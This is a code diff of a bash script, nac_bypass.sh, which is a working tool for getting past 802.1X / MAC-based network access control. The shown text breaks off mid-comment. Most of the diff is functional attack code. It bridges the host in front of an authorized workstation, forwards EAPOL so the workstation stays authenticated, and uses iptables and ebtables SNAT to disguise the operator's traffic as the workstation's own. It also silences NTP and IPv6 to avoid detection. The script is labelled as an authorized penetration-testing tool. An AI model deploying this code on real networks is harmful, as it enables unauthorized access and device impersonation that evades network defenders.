@@ -1,118 +1,106 @@
 #!/bin/bash
 #==============================================================================
-# nac_bypass.sh - Transparent-bridge NAC bypass utility (v3.1)
+# nac_bypass.sh - Transparent-bridge NAC bypass POC (v4.0)
 #
-# Authorized internal pen-testing tool. Inserts the host between a legitimate
-# workstation and an 802.1X / MAC-auth switch port, transparently bridges the
-# workstation's traffic so its NAC session stays alive, and configures L2/L3
-# masquerade rules so the operator's tools (nmap, NetExec, Impacket, SMB, etc.)
-# egress the wire as that workstation. Return traffic is reverse-NAT'd by
-# conntrack and delivered to the local stack instead of being bridged on to
-# the workstation.
+# Authorized internal pen-testing tool. Inserts the host between an authorized
+# workstation and its switch port. The workstation's 802.1X / MAC-auth session
+# stays alive THROUGH the bridge; the host injects its own traffic so that on
+# the wire it appears to come from the workstation, and reply traffic is
+# pulled back into the host's stack (not bridged on to the workstation).
 #
-# v3.1 changes (post-review):
-#   * Static ARP installed via `ip neigh` (not deprecated `arp(8)`)         CRIT-1
-#   * Default route added (not replaced); existing defaults snapshotted     CRIT-2
-#   * Named iptables/ebtables chains (no more global `nat -F`)              CRIT-3
-#   * br_netfilter / nf_conntrack now mandatory (sysctl-path check)         CRIT-4 / HIGH-7
-#   * learn() requires gateway info; refuses to proceed without it          CRIT-5
-#   * full_reset brings physical NICs back UP                               CRIT-6
-#   * Egress lock now blocks `-o BRINT`, installed before enslaving         CRIT-7
-#   * usage() exits non-zero on argument errors                             HIGH-1
-#   * BRINT persisted; -r without -b can still find the bridge              HIGH-2
-#   * DHCP parser tolerant of tcpdump 4.9 / 4.99 / 5.x output variants      HIGH-3
-#   * SNAT range moved above default ip_local_port_range; --random-fully    HIGH-4
-#   * sysctl reads/writes go through helpers (no PATH lookup mix)           HIGH-5
-#   * NetworkManager interfaces marked unmanaged via nmcli                  HIGH-6
-#   * `-D <ip>` for secondary DNS; numeric/IP CLI args validated            MED-2 / MED-4
-#   * Drop weak gateway-IP heuristic (.1/.254)                              MED-3
-#   * Date included in log timestamps                                       MED-5
-#   * Removed redundant ebtables `-o BRINT` rule                            MED-6
-#   * install_masquerade flushes named chains first (no rule stacking)      MED-7
+# How the model works (top-to-bottom):
+#
+#     [ Workstation ] <-- eth_comp -- [ br0 ] -- eth_sw --> [ Switch / Phone ]
+#                                       |
+#                                  [ Local stack ]
+#                                  src 169.254.66.66
+#                                       |
+#                                  iptables SNAT  -> COMIP:port
+#                                  ebtables SNAT  -> COMPMAC (egress eth_sw)
+#                                  conntrack tracks return flows
+#
+# On outbound: locally-generated frames egress br0, get SNAT'd at L3 to the
+# workstation's IP and at L2 to the workstation's MAC, then go out the switch
+# side. They look indistinguishable from the workstation's own traffic.
+#
+# On return: replies arrive on the switch side with dst = workstation. Bridge
+# netfilter hooks fire; conntrack reverse-NATs the destination back to our
+# bridge IP. The kernel re-routes to the local stack instead of bridging on.
+# The workstation never sees the reply.
+#
+# This script is intentionally minimal: it builds the bridge, learns the
+# identities (or accepts them from the operator), installs masquerade, prints
+# a banner, and waits. Ctrl+C cleans everything up. No Responder / SSH /
+# port-forwarding - run those tools yourself in a second terminal.
 #==============================================================================
 
 set -u
 set -o pipefail
 
-VERSION="3.1"
+VERSION="4.0"
 SCRIPT_NAME="$(basename "$0")"
 
 #==============================================================================
-# Configuration (defaults; CLI overrides where applicable)
+# Configuration
 #==============================================================================
-SWINT="eth0"
-COMPINT="eth1"
-BRINT="nacbr0"
-MONITOR_INTERFACE=""
+BRINT="br0"                     # bridge name
+SWINT=""                        # NIC plugged into switch / phone
+COMPINT=""                      # NIC plugged into workstation
 
-# Bridge link-local addressing (the host's identity *internally*)
+# Bridge link-local subnet. Anything inside 169.254.0.0/16 works; we pick a
+# /24 we never expect to see in the real network.
 BRIP="169.254.66.66"
 BRGW="169.254.66.1"
-BRMASK_BITS="24"
+BRMASK="24"
 
-# Egress
-DNS_PRIMARY="1.1.1.1"
-DNS_SECONDARY="8.8.8.8"
-ROUTE_METRIC=0
-SNAT_RANGE="61001-65535"        # above default ip_local_port_range; HIGH-4
+# High port range for L3 SNAT. Above default ip_local_port_range on Linux
+# (32768-60999) and on Windows, so collision with the workstation's own
+# outbound flows is unlikely.
+SNAT_RANGE="61000-65000"
 
-# Service redirection
-RESPONDER_TCP_PORTS=(21 25 80 110 139 143 389 443 445 587 1433 3128)
-RESPONDER_UDP_PORTS=(53 137 138 389 1434 5353)
-DPORT_SSH=50222
-PORT_SSH=50022
+# Passive-learning timeout. 60s is enough for an active workstation to
+# emit at least one TCP SYN or ARP request.
+LEARN_TIMEOUT=60
 
-# Tuning
-LEARN_TIMEOUT=45
-TIMER=5
-THRESHOLD_UP=3
-THRESHOLD_DOWN=5
-
-# Named chains - lets cleanup remove only our rules (CRIT-3)
-NAC_NAT_OUT="NACBYPASS_OUT"
-NAC_NAT_IN="NACBYPASS_IN"
-NAC_EBT_NAT="NACBYPASS"
-
-# State directory
+# State directory. Every change we make leaves a marker here so cleanup
+# reverses ONLY what we touched.
 STATE_DIR="/run/nac_bypass"
 [ -d /run ] || STATE_DIR="/tmp/nac_bypass"
 RUN_LOG=""
 
+# Dedicated chains - bypass rules go here so cleanup never flushes the
+# operator's unrelated NAT setup.
+NAC_NAT_CHAIN="NAC_BYPASS"
+NAC_EBT_CHAIN="NAC_BYPASS"
+
 # CLI flags
-OPT_RESPONDER=0
-OPT_SSH=0
 OPT_VERBOSE=0
-OPT_AUTONOMOUS=0
 OPT_RESET_ONLY=0
 GWMAC_USER=""
+GWIP_USER=""
+COMPMAC_USER=""
+COMIP_USER=""
 
 # Resolved at runtime
 SWMAC=""
 COMPMAC=""
-GWMAC=""
 COMIP=""
+GWMAC=""
 GWIP=""
 
 CMD_IP=""
 CMD_IPTABLES=""
 CMD_EBTABLES=""
-CMD_ARPTABLES=""
 CMD_TCPDUMP=""
-CMD_MACCHANGER=""
 CMD_NMCLI=""
-CMD_SYSCTL=""
 
 INITIALISED=0
 CONN_ACTIVE=0
 TRAP_INSTALLED=0
-
-# RESET_DONE: guard against running full_reset twice (signal handler + EXIT
-# trap can race). One-shot for the *script process* lifetime; the script
-# always exits after a reset, so this is the right scope. (MED-9 doc)
 RESET_DONE=0
 
 #==============================================================================
-# Logging - timestamps include date (MED-5)
+# Logging
 #==============================================================================
 _log() {
     local level=$1; shift
@@ -126,9 +114,6 @@ _log() {
     esac
     local ts; ts="$(date +'%F %T')"
     printf '%b[%s] [%-4s] %s%b\n' "$color" "$ts" "$level" "$*" "$reset"
-    # File log: only write if RUN_LOG points to an existing file. Guards
-    # against the redirect erroring AFTER state_clear has removed the file
-    # (bash reports redirect-open errors before `2>/dev/null` is applied).
     if [ -n "$RUN_LOG" ] && [ -e "$RUN_LOG" ]; then
         printf '[%s] [%-4s] %s\n' "$ts" "$level" "$*" >> "$RUN_LOG" 2>/dev/null || true
     fi
@@ -141,8 +126,7 @@ debug() { _log DEBUG "$@"; }
 die()   { err "$@"; cleanup_on_error; exit 1; }
 
 #==============================================================================
-# State directory: each change leaves a marker / backup so cleanup reverts
-# *only* what we touched.
+# State directory
 #==============================================================================
 state_init() {
     mkdir -p "$STATE_DIR" 2>/dev/null || die "Cannot create state dir $STATE_DIR"
@@ -150,21 +134,17 @@ state_init() {
     RUN_LOG="$STATE_DIR/run.log"
     : > "$RUN_LOG"
 }
-
 state_set()   { echo "$2" > "$STATE_DIR/$1"; }
 state_get()   { cat "$STATE_DIR/$1" 2>/dev/null || echo ""; }
-state_has()   { [ -e "$STATE_DIR/$1" ]; }
 state_clear() { rm -rf "$STATE_DIR"; RUN_LOG=""; }
 
 #==============================================================================
-# Generic helpers
+# Helpers
 #==============================================================================
 resolve_bin() { command -v "$1" 2>/dev/null || true; }
 has_iface()   { [ -d "/sys/class/net/$1" ]; }
-
 iface_carrier() { cat "/sys/class/net/$1/carrier" 2>/dev/null || echo 0; }
 iface_mac()     { cat "/sys/class/net/$1/address" 2>/dev/null; }
-
 iface_master() {
     local link="/sys/class/net/$1/master"
     [ -e "$link" ] || return 1
@@ -184,141 +164,118 @@ is_valid_ip() {
     [ "$a" -le 255 ] && [ "$b" -le 255 ] && [ "$c" -le 255 ] && [ "$d" -le 255 ]
 }
 
+# Reject IPs that cannot be a usable workstation identity (ARP probe zero,
+# APIPA, loopback, multicast, broadcast).
+is_useful_victim_ip() {
+    is_valid_ip "$1" || return 1
+    local IFS=. a b c d
+    read -r a b c d <<<"$1"
+    [ "$a" -eq 0 ]                       && return 1
+    [ "$a" -eq 127 ]                     && return 1
+    [ "$a" -eq 169 ] && [ "$b" -eq 254 ] && return 1
+    [ "$a" -ge 224 ]                     && return 1
+    [ "$1" = "255.255.255.255" ]         && return 1
+    return 0
+}
+
 is_uint() { [[ "$1" =~ ^[0-9]+$ ]]; }
 
-# sysctl helpers - read/write via /proc/sys to avoid PATH-lookup variance (HIGH-5)
-read_sysctl() {
-    local p="/proc/sys/${1//.//}"
-    [ -r "$p" ] || { echo ""; return 1; }
-    cat "$p" 2>/dev/null
-}
-write_sysctl() {
-    local p="/proc/sys/${1//.//}"
-    [ -w "$p" ] || return 1
-    echo "$2" > "$p" 2>/dev/null
-}
+read_sysctl()  { local p="/proc/sys/${1//.//}"; [ -r "$p" ] && cat "$p" 2>/dev/null || echo ""; }
+write_sysctl() { local p="/proc/sys/${1//.//}"; [ -w "$p" ] && echo "$2" > "$p" 2>/dev/null; }
 
 #==============================================================================
 # Pre-flight validation
 #==============================================================================
 preflight() {
     log "Pre-flight validation..."
-    # Root check is done before state_init/install_trap in main(), so by
-    # the time we get here we know we're root. Re-asserting for safety.
-    [ "$EUID" -eq 0 ] || die "Must run as root."
 
-    # --- required binaries (no longer require arp(8); we use ip neigh) ------
+    # Binaries
     CMD_IP=$(resolve_bin ip)
     CMD_TCPDUMP=$(resolve_bin tcpdump)
-    CMD_MACCHANGER=$(resolve_bin macchanger)
     CMD_EBTABLES=$(resolve_bin ebtables)
     CMD_IPTABLES=$(resolve_bin iptables)
-    CMD_ARPTABLES=$(resolve_bin arptables)
     CMD_NMCLI=$(resolve_bin nmcli)
-    CMD_SYSCTL=$(resolve_bin sysctl)
 
     local missing=()
-    [ -z "$CMD_IP" ]         && missing+=("ip (iproute2)")
-    [ -z "$CMD_TCPDUMP" ]    && missing+=("tcpdump")
-    [ -z "$CMD_MACCHANGER" ] && missing+=("macchanger")
-    [ -z "$CMD_EBTABLES" ]   && missing+=("ebtables")
-    [ -z "$CMD_IPTABLES" ]   && missing+=("iptables")
+    [ -z "$CMD_IP" ]       && missing+=("ip (iproute2)")
+    [ -z "$CMD_TCPDUMP" ]  && missing+=("tcpdump")
+    [ -z "$CMD_EBTABLES" ] && missing+=("ebtables")
+    [ -z "$CMD_IPTABLES" ] && missing+=("iptables")
     if [ ${#missing[@]} -gt 0 ]; then
-        err "Missing required binaries:"
+        err "Missing required tools:"
         for m in "${missing[@]}"; do err "  - $m"; done
-        die "Install: apt-get install iproute2 tcpdump macchanger ebtables iptables"
+        die "Install: apt-get install iproute2 tcpdump ebtables iptables"
     fi
-    debug "Resolved: ip=$CMD_IP iptables=$CMD_IPTABLES ebtables=$CMD_EBTABLES tcpdump=$CMD_TCPDUMP nmcli=${CMD_NMCLI:-none}"
+    debug "Binaries: ip=$CMD_IP iptables=$CMD_IPTABLES ebtables=$CMD_EBTABLES tcpdump=$CMD_TCPDUMP"
 
-    # --- kernel features ----------------------------------------------------
-    if ! "$CMD_IP" link add type bridge name __nacbr_test__ 2>/dev/null; then
+    # Kernel: bridge type works (uses correct iproute2 argument order)
+    "$CMD_IP" link del __nactest__ 2>/dev/null || true
+    if ! "$CMD_IP" link add name __nactest__ type bridge 2>/dev/null; then
         modprobe bridge 2>/dev/null \
-            || die "Kernel bridge support unavailable (modprobe bridge failed)."
-        "$CMD_IP" link add type bridge name __nacbr_test__ 2>/dev/null \
+            || die "Bridge support unavailable. Enable CONFIG_BRIDGE in the kernel."
+        "$CMD_IP" link add name __nactest__ type bridge 2>/dev/null \
             || die "Bridge module loaded but bridge creation still fails."
     fi
-    "$CMD_IP" link del __nacbr_test__ 2>/dev/null || true
+    "$CMD_IP" link del __nactest__ 2>/dev/null || true
 
-    # br_netfilter: MANDATORY. The presence of /proc/sys/net/bridge/* is the
-    # canonical "is it loaded/built-in" indicator (works whether the feature
-    # is a module or compiled in).                                       CRIT-4
+    # br_netfilter MUST be present, else conntrack reverse-NAT does nothing
     if [ ! -e /proc/sys/net/bridge/bridge-nf-call-iptables ]; then
         modprobe br_netfilter 2>/dev/null || true
     fi
     [ -e /proc/sys/net/bridge/bridge-nf-call-iptables ] \
-        || die "br_netfilter is not available. Without it, return-traffic NAT cannot work. Install/enable kernel module 'br_netfilter'."
+        || die "br_netfilter is not available. Without it, reply traffic NAT cannot work."
 
-    # nf_conntrack: MANDATORY for reverse-NAT.                          HIGH-7
+    # nf_conntrack MUST be present for return-traffic NAT
     modprobe nf_conntrack 2>/dev/null || true
     [ -e /proc/net/nf_conntrack ] \
-        || die "nf_conntrack is not available. Without it, SNAT cannot reverse return traffic. Install/enable 'nf_conntrack'."
+        || die "nf_conntrack is not available. SNAT cannot reverse return traffic without it."
 
-    # --- interfaces ---------------------------------------------------------
-    [ "$SWINT" = "$COMPINT" ] && die "-1 ($SWINT) and -2 ($COMPINT) cannot be the same interface."
+    # Interfaces specified?
+    [ -z "$SWINT" ]   && die "Switch-side interface not specified. Use -1 <iface>."
+    [ -z "$COMPINT" ] && die "Workstation-side interface not specified. Use -2 <iface>."
+    [ "$SWINT" = "$COMPINT" ] && die "-1 and -2 cannot be the same interface."
+
+    # Interfaces exist
     has_iface "$SWINT"   || die "Interface '$SWINT' not found (-1)."
     has_iface "$COMPINT" || die "Interface '$COMPINT' not found (-2)."
 
+    # Interfaces have a link (both must be up - otherwise we are wasting time)
+    local sw_c comp_c
+    sw_c=$(iface_carrier "$SWINT")
+    comp_c=$(iface_carrier "$COMPINT")
+    if [ "$sw_c" != "1" ] || [ "$comp_c" != "1" ]; then
+        err "Link state problem:"
+        err "  $SWINT (switch side)       carrier=$sw_c   $( [ "$sw_c" = "1" ] && echo OK || echo "DOWN - check cable to switch/phone")"
+        err "  $COMPINT (workstation side) carrier=$comp_c   $( [ "$comp_c" = "1" ] && echo OK || echo "DOWN - check cable to workstation")"
+        die "Both NICs must have an active link before starting."
+    fi
+    debug "Both NICs have link: $SWINT carrier=$sw_c, $COMPINT carrier=$comp_c"
+
+    # Interfaces not already enslaved to something else
     local m
     if m=$(iface_master "$SWINT")   && [ "$m" != "$BRINT" ]; then
-        die "$SWINT is already attached to bridge '$m'. Detach first or pick another NIC."
+        die "$SWINT is already in bridge '$m'. Detach it first."
     fi
     if m=$(iface_master "$COMPINT") && [ "$m" != "$BRINT" ]; then
-        die "$COMPINT is already attached to bridge '$m'. Detach first or pick another NIC."
+        die "$COMPINT is already in bridge '$m'. Detach it first."
     fi
 
     if has_iface "$BRINT"; then
         warn "Bridge '$BRINT' already exists - will tear down and recreate."
     fi
 
-    # --- routing conflicts --------------------------------------------------
-    if "$CMD_IP" -4 route show 2>/dev/null | grep -qE '^169\.254\.66\.'; then
-        warn "An existing 169.254.66.x route is present; it may conflict with our link-local subnet."
-    fi
-
-    # --- network managers ---------------------------------------------------
-    for svc in NetworkManager.service systemd-networkd.service wpa_supplicant.service; do
-        if systemctl is-active --quiet "$svc" 2>/dev/null; then
-            debug "$svc is active and will be stopped during setup."
-        fi
-    done
-
-    # --- optional features --------------------------------------------------
-    if [ "$OPT_RESPONDER" -eq 1 ]; then
-        if ! resolve_bin responder >/dev/null \
-           && ! resolve_bin Responder >/dev/null \
-           && [ ! -f /usr/share/responder/Responder.py ]; then
-            warn "-R: Responder not detected; redirection rules will install but you must run Responder yourself."
-        fi
-    fi
-    if [ "$OPT_SSH" -eq 1 ]; then
-        local sshd_path
-        sshd_path=$(resolve_bin sshd) || true
-        if [ -z "$sshd_path" ] && [ ! -x /usr/sbin/sshd ]; then
-            die "-S requested but sshd not installed. Install: apt-get install openssh-server"
-        fi
-    fi
-
-    # --- promiscuous-mode capability check (briefly toggles SWINT)  LOW-5 ---
-    if ! "$CMD_IP" link set "$SWINT" promisc on 2>/dev/null; then
-        die "Cannot enable promiscuous mode on $SWINT (NIC busy or capability denied)."
-    fi
-    "$CMD_IP" link set "$SWINT" promisc off 2>/dev/null || true
-
-    if ! "$CMD_MACCHANGER" --help >/dev/null 2>&1; then
-        die "macchanger appears non-functional."
-    fi
-
     ok "Pre-flight checks passed."
 }
 
 #==============================================================================
-# Host lockdown
+# Host lockdown - quiet the box so it doesn't leak its real identity, and
+# enable the kernel features the bypass depends on. Every change records
+# state so cleanup is exact.
 #==============================================================================
 host_lockdown() {
     log "Hardening host network state..."
 
-    # Mark interfaces as NM-unmanaged so a mid-run NM restart can't touch
-    # them. Recorded for restore.                                       HIGH-6
+    # Mark NICs unmanaged so NM can't fight us if it restarts mid-run
     if [ -n "$CMD_NMCLI" ]; then
         : > "$STATE_DIR/nmcli_unmanaged"
         for iface in "$SWINT" "$COMPINT"; do
@@ -328,7 +285,7 @@ host_lockdown() {
         done
     fi
 
-    # NetworkManager / systemd-networkd off, recorded for restore
+    # Stop network management daemons
     : > "$STATE_DIR/services_stopped"
     for svc in NetworkManager.service systemd-networkd.service wpa_supplicant.service; do
         if systemctl is-active --quiet "$svc" 2>/dev/null; then
@@ -336,7 +293,7 @@ host_lockdown() {
         fi
     done
 
-    # Stop NTP (would broadcast and leak host identity)
+    # Stop NTP - it would broadcast and leak the host's existence
     : > "$STATE_DIR/ntp_stopped"
     for svc in ntp.service ntpsec.service chronyd.service systemd-timesyncd.service; do
         if systemctl is-active --quiet "$svc" 2>/dev/null; then
@@ -345,256 +302,338 @@ host_lockdown() {
     done
     timedatectl set-ntp false 2>/dev/null || true
 
-    # IPv6 off (workstations sometimes do RA/DHCPv6 chatter we don't NAT)
-    state_set "ipv6_disable_all" "$(read_sysctl net.ipv6.conf.all.disable_ipv6)"
+    # Kernel settings (recorded for restore)
+    state_set "ipv6_disable_all"  "$(read_sysctl net.ipv6.conf.all.disable_ipv6)"
     write_sysctl net.ipv6.conf.all.disable_ipv6 1 || true
 
-    # Bridge-netfilter integration (mandatory for return-traffic NAT)
-    state_set "br_nf_call_ipt" "$(read_sysctl net.bridge.bridge-nf-call-iptables)"
+    state_set "br_nf_call_ipt"    "$(read_sysctl net.bridge.bridge-nf-call-iptables)"
     write_sysctl net.bridge.bridge-nf-call-iptables 1 \
-        || die "Cannot set bridge-nf-call-iptables=1; bypass cannot work."
+        || die "Cannot enable bridge-nf-call-iptables; bypass cannot work."
 
-    # ip_forward enables routing decisions for NAT'd packets so the kernel
-    # delivers reverse-DNAT'd return traffic locally instead of bridging it on.
-    state_set "ip_forward" "$(read_sysctl net.ipv4.ip_forward)"
+    state_set "ip_forward"        "$(read_sysctl net.ipv4.ip_forward)"
     write_sysctl net.ipv4.ip_forward 1 \
         || die "Cannot enable ip_forward; bypass cannot work."
 
     state_set "icmp_ignore_bcast" "$(read_sysctl net.ipv4.icmp_echo_ignore_broadcasts)"
     write_sysctl net.ipv4.icmp_echo_ignore_broadcasts 1 || true
 
-    # Backup and rewrite resolv.conf (queries leave via bridge -> SNAT)
-    if [ -f /etc/resolv.conf ] && [ ! -f "$STATE_DIR/resolv.conf.bak" ]; then
-        cp -a /etc/resolv.conf "$STATE_DIR/resolv.conf.bak"
-    fi
-    {
-        echo "# Written by $SCRIPT_NAME - restored on cleanup"
-        echo "nameserver $DNS_PRIMARY"
-        [ -n "$DNS_SECONDARY" ] && echo "nameserver $DNS_SECONDARY"
-    } > /etc/resolv.conf
-
-    # Snapshot existing default routes so we can restore them in cleanup
-    # (paired with `ip route add` instead of `replace`).                CRIT-2
+    # Snapshot existing default routes so cleanup can restore them
     "$CMD_IP" -4 route show default 2>/dev/null > "$STATE_DIR/default_routes.bak" || true
-
-    # Multicast off on the physical NICs to silence IGMP joins
-    for iface in "$SWINT" "$COMPINT"; do
-        local cur; cur=$(cat "/sys/class/net/$iface/flags" 2>/dev/null || echo 0)
-        state_set "multicast.$iface" "$cur"
-        "$CMD_IP" link set "$iface" multicast off 2>/dev/null || true
-    done
 
     debug "Host lockdown complete."
 }
 
 #==============================================================================
-# Named-chain helpers - the bypass installs all of its rules into private
-# chains and only those chains are flushed/deleted on cleanup, so the
-# operator's unrelated NAT rules survive untouched.                      CRIT-3
+# Bridge construction.
+#
+# Critical details:
+#   - STP off and forward_delay=0  -> bridge forwards from the very first
+#     frame. The default 30-second STP listening/learning phase would silently
+#     kill 802.1X auth, since EAPOL frames would be dropped during it.
+#   - group_fwd_mask=8 lets EAPOL (01:80:c2:00:00:03) traverse the bridge.
+#     Linux bridges drop the 802.1D reserved multicast range by default.
+#   - Slaves are enslaved WITHOUT `ip link set down`. Bringing them down
+#     bounces the link, which on 802.1X switches triggers re-authentication.
+#     Re-auth puts the workstation port in unauthorized state and breaks DHCP.
 #==============================================================================
-nac_chains_create() {
-    # iptables nat
-    "$CMD_IPTABLES" -t nat -N "$NAC_NAT_OUT" 2>/dev/null || \
-        "$CMD_IPTABLES" -t nat -F "$NAC_NAT_OUT"
-    "$CMD_IPTABLES" -t nat -N "$NAC_NAT_IN"  2>/dev/null || \
-        "$CMD_IPTABLES" -t nat -F "$NAC_NAT_IN"
+bridge_create() {
+    log "Creating transparent bridge $BRINT ($SWINT <-> $COMPINT)..."
 
-    # Hook them into the built-in chains exactly once. -C is supported on all
-    # iptables backends we care about (legacy and -nft compat shim).
-    "$CMD_IPTABLES" -t nat -C POSTROUTING -j "$NAC_NAT_OUT" 2>/dev/null \
-        || "$CMD_IPTABLES" -t nat -A POSTROUTING -j "$NAC_NAT_OUT"
-    "$CMD_IPTABLES" -t nat -C PREROUTING  -j "$NAC_NAT_IN"  2>/dev/null \
-        || "$CMD_IPTABLES" -t nat -A PREROUTING  -j "$NAC_NAT_IN"
-
-    # ebtables nat
-    "$CMD_EBTABLES" -t nat -N "$NAC_EBT_NAT" 2>/dev/null || \
-        "$CMD_EBTABLES" -t nat -F "$NAC_EBT_NAT"
-    if ! "$CMD_EBTABLES" -t nat -L POSTROUTING 2>/dev/null | grep -q "^-j $NAC_EBT_NAT\b"; then
-        "$CMD_EBTABLES" -t nat -A POSTROUTING -j "$NAC_EBT_NAT"
-    fi
-
-    state_set "chains_created" "1"
-}
-
-nac_chains_destroy() {
-    "$CMD_IPTABLES" -t nat -D POSTROUTING -j "$NAC_NAT_OUT" 2>/dev/null || true
-    "$CMD_IPTABLES" -t nat -D PREROUTING  -j "$NAC_NAT_IN"  2>/dev/null || true
-    "$CMD_IPTABLES" -t nat -F "$NAC_NAT_OUT" 2>/dev/null || true
-    "$CMD_IPTABLES" -t nat -F "$NAC_NAT_IN"  2>/dev/null || true
-    "$CMD_IPTABLES" -t nat -X "$NAC_NAT_OUT" 2>/dev/null || true
-    "$CMD_IPTABLES" -t nat -X "$NAC_NAT_IN"  2>/dev/null || true
-
-    "$CMD_EBTABLES" -t nat -D POSTROUTING -j "$NAC_EBT_NAT" 2>/dev/null || true
-    "$CMD_EBTABLES" -t nat -F "$NAC_EBT_NAT" 2>/dev/null || true
-    "$CMD_EBTABLES" -t nat -X "$NAC_EBT_NAT" 2>/dev/null || true
-
-    rm -f "$STATE_DIR/chains_created"
-}
-
-#==============================================================================
-# Bridge construction
-#==============================================================================
-bridge_build() {
-    log "Building transparent bridge $BRINT ($SWINT <-> $COMPINT)..."
-
+    # Remove any stale bridge
     if has_iface "$BRINT"; then
         "$CMD_IP" link set "$BRINT" down 2>/dev/null || true
         "$CMD_IP" link del "$BRINT" 2>/dev/null || true
     fi
 
     "$CMD_IP" link add name "$BRINT" type bridge stp_state 0 forward_delay 0 \
-        || die "Bridge creation failed."
+        || die "Failed to create bridge $BRINT."
     state_set "bridge_owned" "1"
-    state_set "bridge_name"  "$BRINT"   # so '-r' without -b can find it. HIGH-2
+    state_set "bridge_name"  "$BRINT"
+    state_set "swint"        "$SWINT"
+    state_set "compint"      "$COMPINT"
 
-    # Forward EAPOL frames (bit 3 of group_fwd_mask = 01-80-C2-00-00-03)
+    # Force MTU 1500 - prevents an unexpectedly small slave MTU (PPPoE,
+    # tunneled NIC, etc.) from breaking EAP-TLS fragment exchange or
+    # full-size frames the workstation expects.
+    "$CMD_IP" link set "$BRINT" mtu 1500 2>/dev/null || true
+
+    # Enable EAPOL forwarding (bit 3 of group_fwd_mask = 01:80:c2:00:00:03,
+    # the PAE multicast address). Without this the Linux bridge silently
+    # drops all 802.1X frames and the workstation never re-authenticates.
     if [ -e "/sys/class/net/$BRINT/bridge/group_fwd_mask" ]; then
         echo 8 > "/sys/class/net/$BRINT/bridge/group_fwd_mask" 2>/dev/null \
             || warn "Could not enable EAPOL forwarding via group_fwd_mask."
     fi
 
-    # Lock egress on the bridge BEFORE attaching slaves, so any locally-
-    # generated packet that gets routed through the bridge during the
-    # configuration window gets dropped instead of leaking with the
-    # operator's real source IP/MAC.                                     CRIT-7
-    install_egress_lock
-
-    # Bring members down, flush addresses, attach to bridge, promiscuous on.
-    for iface in "$SWINT" "$COMPINT"; do
-        "$CMD_IP" link set "$iface" down                       || die "Failed to down $iface."
-        "$CMD_IP" addr flush dev "$iface" >/dev/null 2>&1
-        "$CMD_IP" link set "$iface" master "$BRINT"            || die "Failed to enslave $iface to $BRINT."
-        "$CMD_IP" link set "$iface" promisc on                 || die "Failed promisc on $iface."
-        "$CMD_IP" link set "$iface" up                         || die "Failed to bring $iface up."
-    done
-
-    # Bridge MAC = SWINT's MAC: locally-generated frames bear a MAC the switch
-    # already learned for this port (before ebtables rewrites them to COMPMAC
-    # for the wire).
-    SWMAC=$(iface_mac "$SWINT")
-    is_valid_mac "$SWMAC" || die "Could not read MAC of $SWINT."
-    "$CMD_MACCHANGER" -m "$SWMAC" "$BRINT" >/dev/null 2>&1 \
-        || warn "macchanger failed; bridge MAC may not match SWINT MAC."
-
+    # Bring the bridge UP *before* enslaving slaves. Once a slave is
+    # attached to an already-up bridge, frames are forwardable the instant
+    # the second slave joins - no window where the bridge is admin-DOWN
+    # while frames are arriving. Critical for 802.1X (especially PEAP-
+    # MSCHAPv2 TLS fragments, which retransmit slowly on drop).
     "$CMD_IP" link set "$BRINT" promisc on
     "$CMD_IP" link set "$BRINT" up
 
+    # Install egress lock NOW. Bridge is up but has no slaves, so no frames
+    # can flow yet anyway, but the lock guards any locally-generated frame
+    # that would route via br0 during enslavement.
+    install_egress_lock
+
+    # Mark the bridge itself NM-unmanaged. If NetworkManager restarts mid-
+    # session (a common operator habit on a Kali host), it must not try to
+    # take over br0 and reconfigure it.
+    if [ -n "$CMD_NMCLI" ]; then
+        if "$CMD_NMCLI" device set "$BRINT" managed no 2>/dev/null; then
+            echo "$BRINT" >> "$STATE_DIR/nmcli_unmanaged"
+        fi
+    fi
+
+    # Enslave SWINT first - the Linux bridge auto-inherits the first slave's
+    # MAC as its own. Doing SWINT first means the bridge ends up with the
+    # switch-side NIC's MAC, which is what we want our ebtables `-s SWMAC`
+    # rule to match. We then read the bridge MAC back rather than assuming.
+    for iface in "$SWINT" "$COMPINT"; do
+        "$CMD_IP" addr flush dev "$iface" >/dev/null 2>&1
+        "$CMD_IP" link set "$iface" master "$BRINT" || die "Failed to enslave $iface to $BRINT."
+        "$CMD_IP" link set "$iface" promisc on      || die "Failed to enable promisc on $iface."
+        "$CMD_IP" link set "$iface" up              || die "Failed to bring $iface up."
+    done
+
+    # Read the bridge's actual MAC and use that as SWMAC for the ebtables
+    # rewrite rule. This is more robust than asserting it should equal
+    # SWINT's MAC: if for any reason the kernel chose a different MAC, our
+    # rule still matches what's actually on the wire.
+    SWMAC=$(iface_mac "$BRINT")
+    is_valid_mac "$SWMAC" || die "Bridge $BRINT does not have a valid MAC after enslavement."
+    debug "Bridge MAC = $SWMAC (inherited from first slave $SWINT)"
+
     INITIALISED=1
-    ok "Bridge $BRINT live (silent; egress locked until masquerade is armed)."
+    ok "Bridge $BRINT is live (silent; egress locked until masquerade is armed)."
 }
 
 #==============================================================================
-# Egress lock - blocks the host from emitting any packet on the bridge
-# before SNAT is configured. Lock matches `-o $BRINT` (the actual routing-
-# decision interface for locally-generated packets), NOT the slave NICs.  CRIT-7
+# Egress lock - prevents the host from emitting any packet on the bridge
+# while we're still configuring NAT. Lifts as soon as install_masquerade
+# completes.
 #==============================================================================
 install_egress_lock() {
     "$CMD_IPTABLES" -I OUTPUT 1 -o "$BRINT" -j DROP 2>/dev/null || true
-    if [ -n "$CMD_ARPTABLES" ]; then
-        "$CMD_ARPTABLES" -I OUTPUT 1 -o "$BRINT" -j DROP 2>/dev/null || true
-    fi
     state_set "egress_locked" "1"
 }
-
 remove_egress_lock() {
     "$CMD_IPTABLES" -D OUTPUT -o "$BRINT" -j DROP 2>/dev/null || true
-    if [ -n "$CMD_ARPTABLES" ]; then
-        "$CMD_ARPTABLES" -D OUTPUT -o "$BRINT" -j DROP 2>/dev/null || true
-    fi
     rm -f "$STATE_DIR/egress_locked"
 }
 
 #==============================================================================
 # Passive learning
+#
+# We need three values to install masquerade:
+#   COMPMAC  - workstation's MAC          (so frames on the wire bear it)
+#   COMIP    - workstation's IP           (so SNAT rewrites our src IP to it)
+#   GWMAC    - workstation's gateway MAC  (so frames hit the static neighbor)
+#
+# GWIP is informational only (banner). We never use it operationally; the
+# kernel sends frames to the fictional BRGW=169.254.66.1 whose static neigh
+# entry maps to GWMAC.
+#
+# Primary channel: ANY unicast IPv4 frame leaving the workstation. Captured
+# with `-Q in` on COMPINT so direction is unambiguous (src=workstation,
+# dst=next-hop=gateway). Broadcast/multicast (mDNS, NBNS, SSDP) is filtered
+# out at capture time so we don't pick up frames without a useful gateway
